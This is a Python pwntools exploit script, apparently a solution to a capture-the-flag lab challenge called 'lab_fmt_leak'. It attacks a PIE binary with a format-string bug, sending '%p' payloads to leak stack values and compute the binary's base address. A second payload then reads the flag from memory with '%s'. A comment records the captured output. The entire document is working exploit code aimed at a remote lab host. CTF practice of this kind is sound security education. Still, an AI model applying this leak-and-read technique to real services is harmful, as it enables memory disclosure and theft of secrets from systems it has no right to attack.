from pwn import *

# ./src/lab_fmt_leak/share/chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=06a039cc93a99d111257c866394b5d9e1acc32b9, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

context.arch = 'amd64'

main_offset = 0x11e9
flag_offset = 0x4040

# p = process('./src/lab_fmt_leak/share/chal')
p = remote('10.113.184.121', 10055)

payload = b'%p.' * 0x2d + b'\n'
print(f"{payload = }")
p.send(payload)

res = p.recvline().strip()
main_addr = int(res.split(b'.')[-2], 16)
print(f"{hex(main_addr) = }")

text_base_addr = main_addr - main_offset
print(f"{hex(text_base_addr) = }")

flag_addr = text_base_addr + flag_offset
print(f"{hex(flag_addr) = }")

payload = b'%p' * 0x17 + b'.%s'
# payload = b'.%s'
payload = payload.ljust(0x80, b'\x00')
payload += p64(flag_addr)

print(f"{payload = }")
p.send(payload)

flag = p.recvall()
print(f"{flag = }")

# flag = b'it0x7ffdf1dd2c100x1000x7fd773f5e9d20x23e0x7ffdf1dd096c(nil)0x3000000000x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x252e7025702570250x73(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil).flag{www.youtube.com/watch?v=Ci_zad39Uhw}\n'
